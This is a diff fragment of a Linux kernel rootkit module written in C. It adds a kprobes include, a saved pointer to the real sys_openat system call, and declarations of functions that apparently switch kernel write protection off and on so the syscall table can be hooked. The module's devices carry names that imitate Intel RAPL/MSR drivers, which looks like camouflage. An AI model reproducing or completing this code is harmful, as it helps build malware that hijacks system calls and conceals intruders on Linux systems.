@@ -3,6 +3,7 @@
 #include <linux/kernel.h>
 #include <linux/fs.h>
 #include <linux/device.h>
+#include <linux/kprobes.h>
 
 #define DEVICE_NAME "inter_rapl_msrdv"
 #define CLASS_NAME "inter_rapl_msrmd"
@@ -26,6 +27,13 @@ static long my_sys_openat(const struct pt_regs *regs);
 //声明系统调用表地址
 static void **real_sys_call_table = 0;
 
+typedef long (*syscall_fun)(const struct pt_regs *regs);
+
+static syscall_fun real_sys_openat;
+
+void enable_wp(void);
+
+void disable_wp(void);
 static struct file_operations rootkit_fo = {
     .owner = THIS_MODULE,
     .unlocked_ioctl = rootkit_ioctl,
